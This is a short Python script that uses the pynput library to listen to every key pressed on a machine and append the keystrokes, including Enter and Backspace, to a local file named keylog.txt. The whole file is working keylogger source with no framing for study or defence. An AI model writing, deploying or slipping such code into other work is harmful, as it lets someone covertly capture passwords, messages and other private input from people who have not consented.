import pynput.keyboard


# Function to write the pressed key to a log file
def write_to_log(key):
    key = str(key)
    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'
    elif key == 'Key.backspace':
        key = '[BACKSPACE]'
    elif key == 'Key.shift_r' or key == 'Key.shift':
        key = ''
    elif key == 'Key.ctrl_l' or key == 'Key.ctrl_r':
        key = ''
    elif key == 'Key.alt_l' or key == 'Key.alt_r':
        key = ''
    else:
        key = key.replace("'", "")
    with open("keylog.txt", "a") as f:
        f.write(key)


# Function to handle key press event
def on_press(key):
    try:
        write_to_log(key)
    except AttributeError:
        pass


# Setting up the listener
with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
